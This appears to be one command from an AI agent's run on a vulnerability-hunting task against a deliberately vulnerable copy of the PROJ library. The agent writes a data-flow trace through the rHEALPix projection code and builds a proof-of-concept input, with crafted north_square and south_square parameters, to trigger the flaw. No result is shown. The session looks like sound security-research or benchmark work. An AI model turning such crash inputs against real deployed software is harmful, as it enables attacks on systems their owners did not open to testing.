Command `cd /workspace/repo-vul/src-vul/proj.4 && python3 - <<'PY'
from pathlib import Path
# Final attempt: target the only remaining point where dynamic values affect control flow in rHEALPix image membership.
trace=[
 {"step":1,"file":"src/PJ_healpix.c","function":"PROJECTION(rhealpix)","line":648,"var":"Q->north_square","code":"Q->north_square = pj_param(P->ctx, P->params,\"inorth_square\").i;","note":"The north-square is attacker-controlled through the projection parameters."},
 {"step":2,"file":"src/PJ_healpix.c","function":"PROJECTION(rhealpix)","line":649,"var":"Q->south_square","code":"Q->south_square = pj_param(P->ctx, P->params,\"isouth_square\").i;","note":"The south-square is also attacker-controlled through the same projection string."},
 {"step":3,"file":"src/PJ_healpix.c","function":"in_image","line":193,"var":"rhealpixVertsJit[1][0]","code":"rhealpixVertsJit[1][0]  = -M_PI + north_square*M_HALFPI- EPS;","note":"North-square directly shapes the polygon vertices used by the inside-image test."},
 {"step":4,"file":"src/PJ_healpix.c","function":"in_image","line":205,"var":"rhealpixVertsJit[7][0]","code":"rhealpixVertsJit[7][0]  = -M_PI + (south_square + 1.0)*M_HALFPI + EPS;","note":"South-square directly shapes the lower polygon vertices used by the same test."},
 {"step":5,"file":"src/PJ_healpix.c","function":"pnpoly","line":127,"var":"counter","code":"if (counter % 2 == 0) { return 0; } else { return 1; }","note":"The generated vertices determine whether the test point is considered inside or outside the rHEALPix image."},
 {"step":6,"file":"src/PJ_healpix.c","function":"s_rhealpix_inverse","line":571,"var":"in_image(xy.x, xy.y, 1, Q->north_square, Q->south_square)","code":"if (in_image(xy.x, xy.y, 1, Q->north_square, Q->south_square) == 0) {","note":"The inverse path relies on that polygon classification before continuing to the cap-combination logic."}
]
Path('/workspace/candidate_trace.json').write_text(__import__('json').dumps(trace, ensure_ascii=False))
Path('/workspace/poc.bin').write_text('+proj=rhealpix +ellps=WGS84 +north_square=2 +south_square=1\n-179 89\n')
PY
python3 - <<'PY'
import os, subprocess
env=os.environ.copy(); env['LD_LIBRARY_PATH']=os.path.join(os.getcwd(),'src','.libs')
p=subprocess.run([os.path.join(os.getcwd(),'src','.libs','proj'), '+proj=rhealpix', '+ellps=WGS84', '+north_square=2', '+south_square=1'], input=b'-179 89\n', env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
print('rc', p.returncode)
print(p.stdout.decode('utf-8','replace'))
